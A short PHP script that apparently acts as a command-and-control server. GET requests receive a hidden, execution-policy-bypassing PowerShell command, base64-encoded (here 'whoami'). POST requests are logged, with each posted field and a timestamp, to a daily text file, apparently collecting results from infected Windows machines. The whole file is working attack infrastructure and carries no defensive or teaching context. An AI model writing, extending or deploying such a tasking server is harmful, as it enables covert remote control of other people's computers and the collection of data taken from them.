<?php

function getCommand()
{

	//whoami
	$cmdwho = "dwBoAG8AYQBtAGkACgA=";

	echo "powershell -nologo -noprofile -exec bypass -windowstyle hidden -enc ";
	echo $cmdwho;
		
}


function cmdResult()
{
	  $val = "";
    $currentDateTime  =  date('YmdHis',time());
    $currentDate =  date('Ymd',time());
    $fileName = $currentDate.".txt";
    $data = fopen($fileName,'a+');
	
    $val.= $currentDateTime;
    if($_POST){
        foreach($_POST as $key =>$value){
            $val .= '|'.$key.":".$value;
        }
    }
    $val.= "\n";
    fwrite($data,$val);
    fclose($data);

}

if($_SERVER['REQUEST_METHOD'] == 'GET')
{
	getCommand();
}
else
{
	cmdResult();
	echo '200';
}

?>
